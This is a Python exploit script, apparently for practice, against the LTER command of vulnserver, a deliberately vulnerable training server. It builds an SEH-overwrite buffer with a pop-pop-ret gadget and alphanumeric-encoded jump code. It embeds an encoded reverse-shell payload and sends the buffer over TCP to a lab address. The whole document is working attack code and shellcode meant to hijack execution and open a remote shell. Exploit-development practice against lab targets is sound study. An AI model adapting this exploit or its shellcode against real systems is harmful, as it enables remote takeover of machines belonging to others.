#!/usr/bin/python

import socket
import sys

host = "192.168.160.106"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver LTER Exploit
## Log data, item 14
## Address=6250120B
## Message=  0x6250120b : pop ecx # pop ecx # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\van6uard\Desktop\vulnserver-master\essfunc.dll)

jump = "\x51\x58"               # push ecx; pop eax
jump += "\x66\x05\x40\x12"      # add ax, 0x1240
jump += "\x50\x5c"              # push eax, pop esp
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a  # add cx, 0x489; call ecx
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x13\x77\x61\x41" ## add  eax, 0x41617713
jump += "\x05\x12\x66\x62\x41" ## add  eax, 0x41626612
jump += "\x05\x12\x55\x41\x41" ## add  eax, 0x41415512
jump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jump += "\x50"                 ## push eax
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x33\x41\x61\x45" ## add  eax, 0x45614133
jump += "\x05\x33\x40\x60\x44" ## add  eax, 0x44604033
jump += "\x50"                 ## push eax


revshell = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLJHK2EPEPUPU0K9KUFQO0CTLKPPVPLKV24LLK0R24LKD2Q84O87QZGVVQKONLGLSQCLTBVLQ0O1HODM5QIWKRL2PR67LK1BTPLKQZWLLKPLTQ3HJC0HUQXQPQLKF9GPC1N3LK1Y28M3WJW9LK6TLKEQIFVQKONLIQHOTMUQIW7HKP2UL64CSMJXWK3MQ4D5KTPXLKQH7T5QN33VLKTLPKLKQHELUQXSLKUTLKS1HPK9G414GT1KQKSQ1IPZ61KOKP1O1OPZLK22ZKLMQMU803VRS0UP3XT743VRQOV42HPLSGWV37KON5NXJ0315PEP7YO4V4PPSXQ9K02K5PKO8U600P60V01PV0QPPPSXJJDOYOKPKON5J7SZS558YPNHY0RH2HURUPC5WIMYKV3Z20QFPWCXZ9NERTSQKOHULE9PSDDLKO0NUXRUJLE8L0OEORQFKON5E8U3BM54UPK9KSPW0WV7P1KF2J5BF9V6KRKM3V9WW4GTWLUQS1LM0DVDTPO65PW40TPP661F661VPVPN660VQCPVSXCIXL7OK6KOIEMYKPPN66QVKOFPCXTHK7EM3PKOIEOKM0UMVJDJSXOVJ5OMMMKON5WLTFSL4JK0KKKP3ES5OK1W4S3BBO2J5P0SKON5A"

# plop shellcode first, then point a register to it. then egghunter after and align esp after 
buf = 'LTER /.:/' 
buf += revshell
buf += 'A'*(3515-82-len(revshell))
buf += jump
buf += 'B'*(82-len(jump))
buf += '\x77\x08\x76\x06'           # nSEH
buf += '\x0b\x12\x50\x62'           # SEH, pop pop retn
buf += '\x41'*2
buf += '\x54\x58'                   # push esp; pop eax
buf += '\x66\x05\x50\x13'           # add ax, 0x1350 ;align ESP to correct address
buf += '\x50\x5c'                   # push eax; pop esp
buf += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a ; encoded instruction \xeb\x80
buf += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
buf += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
buf += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
buf += "\x50"                 ## push eax
buf += 'B'*(4200-3515-4-4-2-4-2)
buf += '\x00\x00'


try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
